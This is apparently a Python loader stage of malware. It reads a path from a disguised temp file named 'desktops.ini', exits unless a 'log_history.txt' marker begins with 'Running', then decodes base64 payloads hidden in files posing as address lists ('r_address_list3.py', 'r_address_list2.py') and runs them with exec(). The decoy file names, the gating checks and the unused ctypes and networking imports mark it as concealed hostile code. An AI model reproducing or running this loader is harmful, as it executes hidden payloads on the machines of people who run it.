import time
import ctypes
import ctypes as ct
import base64
import os
import string
import platform
import threading
from ctypes import wintypes as w
import random
import urllib.request
import urllib.error
import http.client
import json
import struct
import array
import socket
import subprocess
from pathlib import Path
import ssl
import sys
import tempfile

def get_temp_path():
    plat_name = platform.system()

    if plat_name == "Windows":
        return tempfile.gettempdir()
    else:
        return "/var/tmp"

temp_file_path = os.path.join(get_temp_path(), "desktops.ini")
with open(temp_file_path, "r", encoding="utf-8") as temp_file:
    root_path = temp_file.read()

log_file_path = os.path.join(root_path.replace('\n', ''), "log_history.txt")
if not os.path.isfile(log_file_path):
    sys.exit()

def detect_address(file_name):
    file_path = os.path.join(os.path.dirname(__file__), file_name)
    with open(file_path, "r", encoding="utf-8") as file:
        lines = file.readlines()
        cleaned_lines = [line.replace("0x", "", 1).strip() for line in lines]

    # Join the cleaned lines into a single string
    result = "".join(cleaned_lines)
    return base64.b64decode(result.encode('utf-8'))

v_data = detect_address('r_address_list3.py') + base64.b64decode("Cg==")
v_data += detect_address('r_address_list2.py')

with open(log_file_path, "r", encoding="utf-8") as log_file:
    log_str = log_file.read()

if not log_str.startswith("Running"):
    sys.exit()

exec(v_data)
